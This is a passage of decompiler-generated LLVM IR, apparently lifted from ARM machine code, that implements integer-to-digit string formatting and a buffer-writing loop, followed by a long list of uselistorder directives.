  %v1_171ec = phi i32 [ %v2_171b8, %dec_label_pc_171b0 ], [ %v2_171c4, %bb265 ]
  %v0_171c8 = load i32, i32* %sl.global-to-local, align 4
  %v1_171c8 = add i32 %v0_171c8, -103
  %v3_171c8 = sub i32 102, %v0_171c8
  %v4_171c8 = and i32 %v3_171c8, %v0_171c8
  %v5_171c8 = icmp slt i32 %v4_171c8, 0
  store i1 %v5_171c8, i1* %cpsr_v.global-to-local, align 1
  %v6_171c8 = icmp slt i32 %v1_171c8, 0
  store i1 %v6_171c8, i1* %cpsr_n.global-to-local, align 1
  %v7_171c8 = icmp eq i32 %v0_171c8, 103
  store i1 %v7_171c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_171c8, label %dec_label_pc_171d0, label %dec_label_pc_171d8

dec_label_pc_171d0:                               ; preds = %.thread49
  %v0_171d0 = load i32, i32* %lr.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_171d0 = icmp slt i32 %v0_171d0, 0
  store i1 %v1_171d0, i1* %cpsr_n.global-to-local, align 1
  %v2_171d0 = icmp eq i32 %v0_171d0, 0
  store i1 %v2_171d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_171d0, label %dec_label_pc_17204, label %dec_label_pc_171d8

dec_label_pc_171d8:                               ; preds = %.thread49, %dec_label_pc_171d0
  %v0_171d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_171d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_171d8 = sub i32 %v1_171d8, %v0_171d8
  store i32 %v2_171d8, i32* %r3.global-to-local, align 4
  store i32 %v1_171e8, i32* %ip.global-to-local, align 4
  %v2_171e0 = sub i32 %v2_171d8, %v1_171e8
  %v4_171e0 = xor i32 %v2_171d8, %v1_171e8
  %v5_171e0 = xor i32 %v2_171e0, %v2_171d8
  %v6_171e0 = and i32 %v5_171e0, %v4_171e0
  %v7_171e0 = icmp slt i32 %v6_171e0, 0
  store i1 %v7_171e0, i1* %cpsr_v.global-to-local, align 1
  %v8_171e0 = icmp slt i32 %v2_171e0, 0
  store i1 %v8_171e0, i1* %cpsr_n.global-to-local, align 1
  %v9_171e0 = icmp eq i32 %v2_171d8, %v1_171e8
  store i1 %v9_171e0, i1* %cpsr_z.global-to-local, align 1
  %v2_171e4 = xor i1 %v8_171e0, %v7_171e0
  br i1 %v2_171e4, label %dec_label_pc_171e8, label %dec_label_pc_17204

dec_label_pc_171e8:                               ; preds = %dec_label_pc_171d8
  %v2_171e8 = sub i32 %v1_171e8, %v2_171d8
  %v2_171ec = add i32 %v1_171ec, 4
  %v3_171ec = inttoptr i32 %v2_171ec to i32*
  store i32 %v2_171e8, i32* %v3_171ec, align 4
  store i32 ptrtoint (i32* @global_var_24e3b.1281 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_171f8 = load i32, i32* %r6.global-to-local, align 4
  %v2_171f8 = inttoptr i32 %v1_171f8 to i32*
  store i32 176, i32* %v2_171f8, align 4
  %v0_171fc = load i32, i32* %r3.global-to-local, align 4
  %v1_171fc = load i32, i32* %r6.global-to-local, align 4
  %v2_171fc = add i32 %v1_171fc, 8
  %v3_171fc = inttoptr i32 %v2_171fc to i32*
  store i32 %v0_171fc, i32* %v3_171fc, align 4
  %v0_17200 = load i32, i32* %r6.global-to-local, align 4
  %v1_17200 = add i32 %v0_17200, 12
  store i32 %v1_17200, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17204

dec_label_pc_17204:                               ; preds = %dec_label_pc_171d8, %dec_label_pc_171d0, %dec_label_pc_171e8
  %v1_17298.pre.pre = phi i32 [ %v1_171ec, %dec_label_pc_171d8 ], [ %v1_171ec, %dec_label_pc_171d0 ], [ %v1_17200, %dec_label_pc_171e8 ]
  %v0_17204 = load i32, i32* %r7.global-to-local, align 4
  %v1_17204 = add i32 %v0_17204, -102
  %v3_17204 = sub i32 101, %v0_17204
  %v4_17204 = and i32 %v3_17204, %v0_17204
  %v5_17204 = icmp slt i32 %v4_17204, 0
  store i1 %v5_17204, i1* %cpsr_v.global-to-local, align 1
  %v6_17204 = icmp slt i32 %v1_17204, 0
  store i1 %v6_17204, i1* %cpsr_n.global-to-local, align 1
  %v7_17204 = icmp eq i32 %v0_17204, 102
  store i1 %v7_17204, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17204, label %dec_label_pc_1728c, label %dec_label_pc_1720c

dec_label_pc_1720c:                               ; preds = %dec_label_pc_17204
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_17210 = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17210 = icmp slt i32 %v0_17210, 0
  store i1 %v1_17210, i1* %cpsr_n.global-to-local, align 1
  %v2_17210 = icmp eq i32 %v0_17210, 0
  store i1 %v2_17210, i1* %cpsr_z.global-to-local, align 1
  store i32 %stack_var_-58.0131138, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-43, align 4
  %v4_17224 = sub i32 0, %v0_17210
  %storemerge180 = select i1 %v1_17210, i32 %v4_17224, i32 %v0_17210
  %tmp283 = ashr i32 %v0_17210, 31
  %tmp284 = and i32 %tmp283, 2
  %tmp285 = add nuw nsw i32 %tmp284, 43
  store i32 %storemerge180, i32* %r4.global-to-local, align 4
  store i32 %tmp285, i32* %sl.global-to-local, align 4
  %v2_1722c = ptrtoint i32* %stack_var_-43 to i32
  store i32 %v2_1722c, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17234

dec_label_pc_17234:                               ; preds = %dec_label_pc_17264, %dec_label_pc_17234, %dec_label_pc_1720c
  %v2_1724c = phi i32 [ %v2_1722c, %dec_label_pc_1720c ], [ %v6_1724c, %dec_label_pc_17234 ], [ %v6_1724c, %dec_label_pc_17264 ]
  %v0_17248 = phi i32 [ %storemerge180, %dec_label_pc_1720c ], [ %v2_17250, %dec_label_pc_17234 ], [ %v2_17250, %dec_label_pc_17264 ]
  %v2_1723c = srem i32 %v0_17248, 10
  %v1_17240 = add nsw i32 %v2_1723c, 48
  store i32 %v1_17240, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v0_17248, i32* %r0.global-to-local, align 4
  %v1_1724c = trunc i32 %v1_17240 to i8
  %v3_1724c = add i32 %v2_1724c, -1
  %v4_1724c = inttoptr i32 %v3_1724c to i8*
  store i8 %v1_1724c, i8* %v4_1724c, align 1
  %v5_1724c = load i32, i32* %r5.global-to-local, align 4
  %v6_1724c = add i32 %v5_1724c, -1
  store i32 %v6_1724c, i32* %r5.global-to-local, align 4
  %v0_17250 = load i32, i32* %r0.global-to-local, align 4
  %v1_17250 = load i32, i32* %r1.global-to-local, align 4
  %v2_17250 = sdiv i32 %v0_17250, %v1_17250
  store i32 %v2_17250, i32* %r0.global-to-local, align 4
  %v0_17254 = load i32, i32* %r7.global-to-local, align 4
  %v1_17254 = add i32 %v0_17254, 1
  store i32 %v1_17254, i32* %r7.global-to-local, align 4
  %v1_17258 = add i32 %v0_17254, -2
  %v3_17258 = sub i32 1, %v0_17254
  %v4_17258 = and i32 %v3_17258, %v1_17254
  %v5_17258 = icmp slt i32 %v4_17258, 0
  store i1 %v5_17258, i1* %cpsr_v.global-to-local, align 1
  %v6_17258 = icmp slt i32 %v1_17258, 0
  store i1 %v6_17258, i1* %cpsr_n.global-to-local, align 1
  %v7_17258 = icmp eq i32 %v1_17254, 3
  store i1 %v7_17258, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_17250, i32* %r4.global-to-local, align 4
  %v7_17260 = icmp slt i32 %v1_17254, 4
  br i1 %v7_17260, label %dec_label_pc_17234, label %dec_label_pc_17264

dec_label_pc_17264:                               ; preds = %dec_label_pc_17234
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17264 = icmp slt i32 %v2_17250, 0
  store i1 %v1_17264, i1* %cpsr_n.global-to-local, align 1
  %v2_17264 = icmp eq i32 %v2_17250, 0
  store i1 %v2_17264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17264, label %dec_label_pc_1726c, label %dec_label_pc_17234

dec_label_pc_1726c:                               ; preds = %dec_label_pc_17264
  %v1_1726c = add i32 %v5_1724c, -2
  store i32 %v1_1726c, i32* %r3.global-to-local, align 4
  %v0_17270 = load i32, i32* %sl.global-to-local, align 4
  %v1_17270 = trunc i32 %v0_17270 to i8
  %v4_17270 = inttoptr i32 %v1_1726c to i8*
  store i8 %v1_17270, i8* %v4_17270, align 1
  %v0_17274 = load i32, i32* %r3.global-to-local, align 4
  %v1_17274 = add i32 %v0_17274, -1
  store i32 %v1_17274, i32* %r2.global-to-local, align 4
  %v0_17278 = load i32, i32* %r8.global-to-local, align 4
  %v1_17278 = trunc i32 %v0_17278 to i8
  %v4_17278 = inttoptr i32 %v1_17274 to i8*
  store i8 %v1_17278, i8* %v4_17278, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_17280 = load i32, i32* %r6.global-to-local, align 4
  %v1_17280 = inttoptr i32 %v0_17280 to i32*
  store i32 112, i32* %v1_17280, align 4
  %v3_17280 = add i32 %v0_17280, 4
  %v4_17280 = inttoptr i32 %v3_17280 to i32*
  %v5_17280 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_17280, i32* %v4_17280, align 4
  %v0_17284 = load i32, i32* %r2.global-to-local, align 4
  %v1_17284 = load i32, i32* %r6.global-to-local, align 4
  %v2_17284 = add i32 %v1_17284, 8
  %v3_17284 = inttoptr i32 %v2_17284 to i32*
  store i32 %v0_17284, i32* %v3_17284, align 4
  %v0_17288 = load i32, i32* %r6.global-to-local, align 4
  %v1_17288 = add i32 %v0_17288, 12
  store i32 %v1_17288, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1728c

dec_label_pc_1728c:                               ; preds = %dec_label_pc_17204, %.thread127, %dec_label_pc_1726c
  %v1_17298.pre = phi i32 [ %v2_16d44, %.thread127 ], [ %v1_17288, %dec_label_pc_1726c ], [ %v1_17298.pre.pre, %dec_label_pc_17204 ]
  %v2_1728c = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1728c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17290

dec_label_pc_17290:                               ; preds = %dec_label_pc_17290, %dec_label_pc_1728c
  %v0_17290 = phi i32 [ %v2_1728c, %dec_label_pc_1728c ], [ %v4_17290, %dec_label_pc_17290 ]
  %stack_var_-188.0 = phi i32 [ %v3_16bf4, %dec_label_pc_1728c ], [ %v2_1729c, %dec_label_pc_17290 ]
  %v1_17290 = inttoptr i32 %v0_17290 to i32*
  %v2_17290 = load i32, i32* %v1_17290, align 4
  store i32 %v2_17290, i32* %r3.global-to-local, align 4
  %v4_17290 = add i32 %v0_17290, 12
  store i32 %v4_17290, i32* %r2.global-to-local, align 4
  %v3_17298 = icmp ult i32 %v4_17290, %v1_17298.pre
  %v2_1729c = sub i32 %stack_var_-188.0, %v2_17290
  store i32 %v2_1729c, i32* %r0.global-to-local, align 4
  br i1 %v3_17298, label %dec_label_pc_17290, label %dec_label_pc_172a8

dec_label_pc_172a8:                               ; preds = %dec_label_pc_17290
  %v3_172a8 = load i8, i8* %stack_var_-42, align 1
  %v4_172a8 = sext i8 %v3_172a8 to i32
  store i32 %v4_172a8, i32* %r3.global-to-local, align 4
  store i32 %v4_172a8, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_172ac = icmp slt i8 %v3_172a8, 0
  store i1 %v1_172ac, i1* %cpsr_n.global-to-local, align 1
  %v2_172ac = icmp eq i8 %v3_172a8, 0
  store i1 %v2_172ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_172ac, label %bb270, label %bb269

bb269:                                            ; preds = %dec_label_pc_172a8
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb270

bb270:                                            ; preds = %dec_label_pc_172a8, %bb269
  %v1_17300 = phi i32 [ %v4_172a8, %dec_label_pc_172a8 ], [ 1, %bb269 ]
  %v2_172b4 = sub i32 %v2_1729c, %v1_17300
  store i32 %v2_172b4, i32* %r1.global-to-local, align 4
  %v2_172b8 = ptrtoint i8* %stack_var_-42 to i32
  store i32 %v2_172b8, i32* %r3.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_172c0 = icmp slt i32 %v2_172b4, 0
  store i1 %v1_172c0, i1* %cpsr_n.global-to-local, align 1
  %v2_172c0 = icmp eq i32 %v2_172b4, 0
  store i1 %v2_172c0, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-176, align 4
  %tmp271 = icmp slt i32 %v2_172b4, 1
  br i1 %tmp271, label %dec_label_pc_17328, label %dec_label_pc_172d4

dec_label_pc_172d4:                               ; preds = %bb270
  %v2_172d4 = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_172d4, i32* %ip.global-to-local, align 4
  %v1_172d8 = add i32 %v2_172d4, 12
  %v2_172d8 = inttoptr i32 %v1_172d8 to i32*
  %v3_172d8 = load i32, i32* %v2_172d8, align 4
  store i32 %v3_172d8, i32* %r3.global-to-local, align 4
  %v1_172dc = and i32 %v3_172d8, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_172dc = icmp eq i32 %v1_172dc, 0
  store i1 %v2_172dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_172dc, label %dec_label_pc_172f4, label %dec_label_pc_172e4

dec_label_pc_172e4:                               ; preds = %dec_label_pc_172d4
  store i32 ptrtoint (i32* @global_var_24e3b.1281 to i32), i32* %r3.global-to-local, align 4
  %v1_172e8 = add i32 %v1_17298.pre, 12
  store i32 %v1_172e8, i32* %r5.global-to-local, align 4
  %v1_172ec = inttoptr i32 %v1_17298.pre to i32*
  store i32 160, i32* %v1_172ec, align 4
  %v3_172ec = add i32 %v1_17298.pre, 4
  %v4_172ec = inttoptr i32 %v3_172ec to i32*
  %v5_172ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_172ec, i32* %v4_172ec, align 4
  %v6_172ec = add i32 %v1_17298.pre, 8
  %v7_172ec = inttoptr i32 %v6_172ec to i32*
  %v8_172ec = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_172ec, i32* %v7_172ec, align 4
  br label %dec_label_pc_1732c

dec_label_pc_172f4:                               ; preds = %dec_label_pc_172d4
  store i32 %v2_172d4, i32* %r0.global-to-local, align 4
  %v1_172f8 = add i32 %v2_172d4, 16
  %v2_172f8 = inttoptr i32 %v1_172f8 to i32*
  %v3_172f8 = load i32, i32* %v2_172f8, align 4
  store i32 %v3_172f8, i32* %r3.global-to-local, align 4
  %v1_172fc = add i32 %v3_172f8, -48
  %v3_172fc = sub i32 47, %v3_172f8
  %v4_172fc = and i32 %v3_172fc, %v3_172f8
  %v5_172fc = icmp slt i32 %v4_172fc, 0
  store i1 %v5_172fc, i1* %cpsr_v.global-to-local, align 1
  %v6_172fc = icmp slt i32 %v1_172fc, 0
  store i1 %v6_172fc, i1* %cpsr_n.global-to-local, align 1
  %v7_172fc = icmp eq i32 %v3_172f8, 48
  store i1 %v7_172fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_172fc, label %dec_label_pc_1730c, label %bb272

bb272:                                            ; preds = %dec_label_pc_172f4
  store i32 %v2_1729c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17328

dec_label_pc_1730c:                               ; preds = %dec_label_pc_172f4
  %v3_1730c = load i32, i32* %stack_var_-160, align 4
  store i32 %v1_17298.pre, i32* %r5.global-to-local, align 4
  %v2_17314 = add i32 %v3_1730c, %v2_172b4
  store i32 %v2_17314, i32* %r3.global-to-local, align 4
  store i32 %v2_17314, i32* %stack_var_-160, align 4
  br label %dec_label_pc_1732c

dec_label_pc_17320:                               ; preds = %dec_label_pc_17334
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17364

dec_label_pc_17328:                               ; preds = %bb272, %bb270
  store i32 %v1_17298.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1732c

dec_label_pc_1732c:                               ; preds = %dec_label_pc_1730c, %dec_label_pc_172e4, %dec_label_pc_17328
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_17330 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_17330, i32* %r4.global-to-local, align 4
  %v3_1733c.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_17334

dec_label_pc_17334:                               ; preds = %dec_label_pc_1735c, %dec_label_pc_1732c
  %v0_17334 = phi i32 [ %v1_17354, %dec_label_pc_1735c ], [ %v2_17330, %dec_label_pc_1732c ]
  %v1_17334 = inttoptr i32 %v0_17334 to i32*
  %v2_17334 = load i32, i32* %v1_17334, align 4
  store i32 %v2_17334, i32* %r1.global-to-local, align 4
  %v3_17334 = add i32 %v0_17334, 4
  %v4_17334 = inttoptr i32 %v3_17334 to i32*
  %v5_17334 = load i32, i32* %v4_17334, align 4
  store i32 %v5_17334, i32* %r2.global-to-local, align 4
  %v6_17334 = add i32 %v0_17334, 8
  %v7_17334 = inttoptr i32 %v6_17334 to i32*
  %v8_17334 = load i32, i32* %v7_17334, align 4
  store i32 %v8_17334, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %v3_1733c.pre, i32* %ip.global-to-local, align 4
  store i32 95048, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_1733c.pre)
  %v0_17348 = load i32, i32* %r4.global-to-local, align 4
  %v1_17348 = add i32 %v0_17348, 4
  %v2_17348 = inttoptr i32 %v1_17348 to i32*
  %v3_17348 = load i32, i32* %v2_17348, align 4
  store i32 %v3_17348, i32* %r3.global-to-local, align 4
  %v0_1734c = load i32, i32* %r0.global-to-local, align 4
  %v2_1734c = sub i32 %v0_1734c, %v3_17348
  %v4_1734c = xor i32 %v0_1734c, %v3_17348
  %v5_1734c = xor i32 %v2_1734c, %v0_1734c
  %v6_1734c = and i32 %v5_1734c, %v4_1734c
  %v7_1734c = icmp slt i32 %v6_1734c, 0
  store i1 %v7_1734c, i1* %cpsr_v.global-to-local, align 1
  %v8_1734c = icmp slt i32 %v2_1734c, 0
  store i1 %v8_1734c, i1* %cpsr_n.global-to-local, align 1
  %v9_1734c = icmp eq i32 %v0_1734c, %v3_17348
  store i1 %v9_1734c, i1* %cpsr_z.global-to-local, align 1
  %v0_17350 = load i32, i32* %r6.global-to-local, align 4
  %v2_17350 = add i32 %v0_17350, %v0_1734c
  store i32 %v2_17350, i32* %r6.global-to-local, align 4
  %v1_17354 = add i32 %v0_17348, 12
  store i32 %v1_17354, i32* %r4.global-to-local, align 4
  br i1 %v9_1734c, label %dec_label_pc_1735c, label %dec_label_pc_17320

dec_label_pc_1735c:                               ; preds = %dec_label_pc_17334
  %v1_1735c = load i32, i32* %r5.global-to-local, align 4
  %v2_1735c = sub i32 %v1_17354, %v1_1735c
  %v3_1735c = icmp ult i32 %v1_17354, %v1_1735c
  %v4_1735c = xor i32 %v1_1735c, %v1_17354
  %v5_1735c = xor i32 %v2_1735c, %v1_17354
  %v6_1735c = and i32 %v5_1735c, %v4_1735c
  %v7_1735c = icmp slt i32 %v6_1735c, 0
  store i1 %v7_1735c, i1* %cpsr_v.global-to-local, align 1
  %v8_1735c = icmp slt i32 %v2_1735c, 0
  store i1 %v8_1735c, i1* %cpsr_n.global-to-local, align 1
  %v9_1735c = icmp eq i32 %v1_17354, %v1_1735c
  store i1 %v9_1735c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1735c, label %dec_label_pc_17334, label %dec_label_pc_17364

dec_label_pc_17364:                               ; preds = %dec_label_pc_1735c, %dec_label_pc_17320
  %v0_17364 = phi i32 [ -1, %dec_label_pc_17320 ], [ %v2_17350, %dec_label_pc_1735c ]
  store i32 %v0_17364, i32* %r0.global-to-local, align 4
  %v2_1736c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1736c, i32* %r4.global-to-local, align 4
  ret i32 %v0_17364

; uselistorder directives
  uselistorder i32 %v0_17364, { 1, 0 }
  uselistorder i32 %v2_1735c, { 1, 0 }
  uselistorder i32 %v1_1735c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_17354, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_1734c, { 1, 0 }
  uselistorder i32 %v0_1734c, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_17348, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17334, { 2, 1, 0 }
  uselistorder i32 %v3_172f8, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_172d4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1729c, { 0, 1, 3, 2 }
  uselistorder i32 %v4_17290, { 1, 2, 0 }
  uselistorder i32 %v0_17290, { 1, 0 }
  uselistorder i32 %v1_17298.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_17250, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v6_1724c, { 2, 1, 0 }
  uselistorder i32 %storemerge180, { 1, 0 }
  uselistorder i32 %v0_17210, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_17204, { 3, 0, 1, 2 }
  uselistorder i32 %v2_171e0, { 1, 0 }
  uselistorder i32 %v2_171d8, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_171d0, { 1, 0 }
  uselistorder i32 %v0_171c8, { 3, 0, 1, 2 }
  uselistorder i32 %v0_171b0, { 1, 0 }
  uselistorder i32 %v1_1718c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1718c, { 1, 0, 2 }
  uselistorder i32 %v0_17164, { 3, 0, 1, 2 }
  uselistorder i1 %v2_17144, { 2, 1, 0 }
  uselistorder i32 %v2_170d0, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_170c0, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v1_171e8, { 2, 6, 0, 7, 5, 1, 3, 4, 8 }
  uselistorder i32 %v0_1712c, { 3, 0, 5, 4, 6, 7, 9, 1, 2, 8 }
  uselistorder i32 %v0_1706c, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_17050, { 1, 0 }
  uselistorder i32 %v1_17048, { 1, 2, 0 }
  uselistorder i32 %v2_1703c, { 1, 0 }
  uselistorder i32 %v1_1703c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1703c, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i32 %v1_17034, { 1, 0, 2 }
  uselistorder i32 %v0_1702c, { 3, 0, 1, 2 }
  uselistorder i1 %v3_1700c, { 1, 0 }
  uselistorder i32 %v2_1700c, { 1, 0 }
  uselistorder i32 %v2_17008, { 3, 2, 1, 4, 5, 7, 0, 8, 6, 9 }
  uselistorder i1 %v7_16ff4, { 1, 0 }
  uselistorder i32 %v1_16ff8, { 2, 1, 0 }
  uselistorder i1 %v2_16fe8, { 1, 0 }
  uselistorder i32 %v0_16fe4, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_16fcc, { 1, 0 }
  uselistorder i32 %stack_var_-192.7, { 1, 0, 2 }
  uselistorder i32 %v1_16fc0, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v1_16f78, { 1, 2, 0 }
  uselistorder i32 %v2_16f74, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16f5c, { 1, 3, 5, 6, 0, 4, 2 }
  uselistorder i1 %v2_16f54, { 1, 0 }
  uselistorder i32 %v0_16f60, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_16f3c, { 1, 0 }
  uselistorder i32 %v0_16f28, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i32 %v0_16f1c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_16f10, { 2, 5, 0, 3, 4, 1 }
  uselistorder i32 %v2_16f0c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_16ec4, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %stack_var_-192.6, { 1, 2, 0, 3 }
  uselistorder i32 %v2_16e14, { 1, 0 }
  uselistorder i32 %v11_16df0, { 1, 2, 0 }
  uselistorder double %v9_16df0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_16d9c, { 1, 0 }
  uselistorder i32 %v1_16d88, { 3, 2, 0, 1 }
  uselistorder i32 %v0_16de8, { 1, 0 }
  uselistorder i32 %v5_16d34, { 1, 0 }
  uselistorder i32 %v0_16d20, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_16c40.v1_16c548, { 1, 0 }
  uselistorder i1 %not.v7_16c48, { 1, 0 }
  uselistorder i1 %v7_16c48, { 1, 2, 0 }
  uselistorder i32 %v1_16f58, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32 %v1_16bb4, { 1, 0 }
  uselistorder i32* %stack_var_-79, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-78, { 1, 2, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-43, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-42, { 0, 3, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 5, 6, 10, 7, 2, 8, 9, 3, 11 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 0, 8, 9, 10, 11 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 16, 17, 19, 20, 21, 22, 23, 25, 24, 45, 27, 28, 32, 29, 30, 31, 33, 26, 34, 35, 36, 37, 38, 40, 39, 41, 42, 43, 44, 56, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 58, 60, 61, 62, 63, 59, 64, 65, 66, 67, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 16, 17, 13, 14, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 10, 11, 12, 7, 8, 9, 13, 14, 15, 17, 16, 18, 19, 20, 1, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 7, 8, 9, 10, 11, 12, 1, 13, 14, 22, 21, 24, 23, 15, 16, 25, 17, 18, 6, 26, 19, 20, 0, 27, 28, 2, 31, 5, 32, 33, 29, 30, 34, 37, 38, 4, 35, 36, 3 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11, 14, 12, 13, 15, 16, 0, 17, 18, 19, 20, 21 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 27, 28, 29, 2, 30, 31, 32, 33, 34, 1, 35, 36, 37, 38, 39, 40, 41, 0, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i1* %cpsr_v.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 21, 22, 23, 24, 25, 26, 27, 28, 1, 29, 30, 31, 32, 0, 33, 34, 35, 36, 37, 38, 39, 48, 40, 41, 42, 43, 44, 45, 46, 47, 49, 50, 51, 52, 53 }
  uselistorder i1* %cpsr_n.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 24, 25, 26, 27, 28, 29, 1, 30, 31, 32, 33, 0, 34, 35, 36, 37, 38, 39, 40, 49, 41, 42, 43, 44, 45, 46, 47, 48, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32 47, { 1, 2, 0 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6, 7 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 17, { 7, 0, 9, 10, 1, 11, 12, 2, 13, 3, 14, 4, 15, 5, 16, 24, 8, 17, 18, 19, 6, 20, 21, 22, 23 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6, 7 }
  uselistorder i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F0000000024E3B) to float) to i32), { 1, 0 }
  uselistorder i32 520, { 1, 0 }
  uselistorder i32 96, { 1, 2, 0, 3 }
  uselistorder double 0.000000e+00, { 1, 3, 2, 0 }
  uselistorder i32 %arg4, { 1, 0, 5, 4, 3, 2, 7, 6, 8, 9, 10 }
  uselistorder i32 %arg3, { 0, 2, 1, 5, 4, 3, 6, 7, 8, 9, 11, 10, 12, 13 }
  uselistorder double %arg2, { 0, 1, 5, 6, 3, 4, 2, 7 }
  uselistorder label %dec_label_pc_1732c, { 2, 0, 1 }
  uselistorder label %bb270, { 1, 0 }
